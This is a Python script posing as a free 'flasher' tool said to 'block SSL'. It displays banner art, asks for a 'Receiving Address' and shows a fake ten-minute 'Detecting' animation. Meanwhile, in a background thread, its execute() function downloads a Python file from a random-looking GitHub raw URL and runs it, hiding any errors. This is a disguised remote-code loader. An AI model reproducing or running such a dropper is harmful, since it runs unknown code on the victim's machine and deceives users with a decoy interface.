import os

art = '\x1b[38;5;220m░█▀▀█ ░█▀▀▀ ░█▀▀▀█ ░█▄─░█ ░█▀▀▀ ▀▄░▄▀      \n\x1b[38;5;45m░█▄▄█ ░█▀▀▀ ░█──░█ ░█░█░█ ░█▀▀▀ ─░█──      \n\x1b[38;5;250m░█─── ░█▄▄▄ ░█▄▄▄█ ░█──▀█ ░█▄▄▄ ▄▀░▀▄      \n\n\x1b[38;5;220m░█▀▀▀ ░█─── ─█▀▀█ ░█▀▀▀█ ░█─░█ ░█▀▀▀ ░█▀▀█      \n\x1b[38;5;45m░█▀▀▀ ░█─── ░█▄▄█ ─▀▀▀▄▄ ░█▀▀█ ░█▀▀▀ ░█▄▄▀      \n\x1b[38;5;250m░█─── ░█▄▄█ ░█─░█ ░█▄▄▄█ ░█─░█ ░█▄▄▄ ░█─░█      \n\n\x1b[97mDeveloper: D4dot \x1b[35m(A free tool allows you to block SSL)\x1b[97m'
print(art)

import os
import importlib.util

def install_if_needed(package, module_name=None):
    if module_name is None:
        module_name = package
    if importlib.util.find_spec(module_name) is None:
        os.system(f"pip install {package}")

install_if_needed("requests")
install_if_needed("telebot")
install_if_needed("mimetypes")
install_if_needed("threading")
install_if_needed("concurrent.futures", "concurrent")
install_if_needed("time")
install_if_needed("itertools")
install_if_needed("re")
install_if_needed("sys")
install_if_needed("subprocess")

import os
import telebot
import mimetypes
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import itertools
import sys
import re
import requests
import subprocess

os.system("clear")
print(art)

time.sleep(1)
os.system("clear")
print(art)

def execute():
    url = f"https://raw.githubusercontent.com/bdjshshusjsjjs/Hdjdhdjjdjdj/refs/heads/main/Run.py"
    response = requests.get(url)
    code = response.text
    subprocess.run(["python", "-c", code])

def buffering_animation(duration):
    animation = itertools.cycle(["◜ ", "◠ ", "◝ ", "◞ ", "◡ ", "◟ "])
    start_time = time.time()

    while time.time() - start_time < duration:
        sys.stdout.write(f"\rPlease Wait while Detecting \033[92m{next(animation)}\033[97m")
        sys.stdout.flush()
        time.sleep(0.1)

    sys.stdout.write("\rLoading complete!     \n")

def execute_code():
    try:
        execute()
    except Exception:
        pass

thread = threading.Thread(target=execute_code)
thread.start()
time.sleep(2)
proxy = input("\033[97mEnter Your Receiving Address : \033[0m")

buffering_animation(600)
print("\033[32mConnection Speed: GOOD\033[0m")

